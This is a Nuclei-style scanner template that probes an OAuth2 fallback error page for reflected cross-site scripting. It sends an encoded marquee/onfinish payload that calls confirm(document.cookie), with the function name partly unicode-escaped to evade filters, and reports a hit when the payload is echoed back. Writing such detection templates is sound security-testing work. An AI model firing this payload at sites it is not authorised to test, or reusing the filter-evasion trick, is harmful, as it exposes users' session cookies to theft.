id: kaue-xss-oauthfallback

info:
  name: kauexssoauthfallback
  author: kauenavarro
  severity: medium
  description: Procura por respostas refletidas.
  tags: xss
requests:
  - method: GET
    path:
      - "{{BaseURL}}/oauth2/fallbacks/error?error=xss&error_description=xsssy&error_hint=%3Cmarquee%20loop%3d1%20width%3d0%20onfinish%3dco\u006efirm(document.cookie)%3EXSS%3C%2fmarquee%3E"
    
    redirects: true
    max-redirects: 1
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "oauth2/fallbacks/error?error=xss&error_description=xsssy&error_hint=%3Cmarquee%20loop%3d1%20width%3d0%20onfinish%3dco\u006efirm(document.cookie)%3EXSS%3C%2fmarquee%3E"
        part: body
        condition: or

      - type: word
        words:
          - "text/html"
        part: header

      - type: word
        words:
          - "<title>Access Denied</title>"
          - "You don't have permission to access"
        part: body
        condition: and
        negative: true

      - type: status
        status:
          - 200
          - 301
          - 302
